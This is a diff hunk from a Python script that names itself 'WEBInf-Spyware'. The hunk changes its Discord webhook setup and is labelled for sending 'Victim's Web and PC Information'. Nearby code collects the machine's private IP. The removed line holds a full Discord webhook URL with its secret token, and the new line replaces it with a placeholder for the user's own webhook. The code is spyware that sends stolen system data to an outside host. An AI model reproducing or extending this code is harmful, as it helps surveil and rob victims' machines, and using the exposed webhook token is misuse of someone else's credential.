@@ -94,7 +94,7 @@ private_ip = socket.gethostbyname(socket.gethostname())
 #       WebHook Initialization        |
 # -------------------------------------
 
-webhook_url = "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr"  # Replace with your Discord webhook URL
+webhook_url = "PLEASE ENTER YOUR WEBHOOK HERE"  # Replace with your Discord webhook URL
 webhook = DiscordWebhook(url=webhook_url, username="WEBInf-Spyware",
                          avatar_url="https://cdn-icons-png.flaticon.com/512/1691/1691918.png",
                          content="Victim's Web and PC Information")
